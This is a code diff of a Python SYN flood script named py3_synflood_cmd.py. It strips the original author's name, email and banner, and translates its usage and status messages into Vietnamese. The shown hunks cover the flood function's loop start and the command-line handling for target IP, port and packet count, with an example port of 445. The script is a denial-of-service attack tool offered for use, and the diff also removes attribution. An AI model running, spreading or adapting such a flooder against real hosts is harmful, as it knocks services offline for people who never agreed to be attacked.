@@ -1,7 +1,4 @@
 #!/usr/bin/python3
-# Emre Ovunc
-# info@emreovunc.com
-# Python3 SYN Flood Tool CMD v2.0.1
 
 from sys import stdout
 from scapy.all import *
@@ -21,7 +18,7 @@ def randInt():
 
 def SYN_Flood(dstIP, dstPort, counter):
 	total = 0
-	print ("Packets are sending ...")
+	print ("Các gói đang gửi ...")
 
 	for x in range (0, counter):
 		s_port = randInt()
@@ -58,28 +55,27 @@ def main():
 	if args.target is not None:
 		if args.port is not None:
 			if args.count is None:
-				print('[!]You did not use --counter/-c parameter, so 1 packet will be sent..')
+				print('[!]Bạn đã không sử dụng tham số --counter / -c, vì vậy 1 gói sẽ được gửi ..')
 				SYN_Flood(args.target, args.port, 1)
 
 			else:
 				SYN_Flood(args.target, args.port, int(args.count))
 
 		else:
-			print('[-]Please, use --port/-p to give target\'s port!')
-			print('[!]Example: -p 445')
-			print('[?] -h for help')
+			print('[-]Vui lòng sử dụng --port / -p để cung cấp cổng của mục tiêu!')
+			print('[!]Ví dụ: -p 445')
+			print('[?]-h để được giúp đỡ')
 			exit()
 	else:
-		print('''usage: py3_synflood_cmd.py [-h] [--target TARGET] [--port PORT]
+		print('''cách sử dụng: py3_synflood_cmd.py [--help] [--target TARGET] [--port PORT]
                            [--count COUNT] [--version]
-optional arguments:
-  -h, --help            show this help message and exit
+đối số tùy chọn:
+  --help, -h hiển thị thông báo trợ giúp này và thoát
   --target TARGET, -t TARGET
-                        target IP address
-  --port PORT, -p PORT  target port number
-  --count COUNT, -c COUNT
-                        number of packets
-  --version, -v         show program's version number and exit''')
+địa chỉ IP mục tiêu
+  --port PORT, -p PORT số cổng mục tiêu
+  --count COUNT, -c ĐẾM
+số lượng gói tin
+  --version, -v hiển thị số phiên bản của chương trình và thoát''')
 		exit()
-
 main()
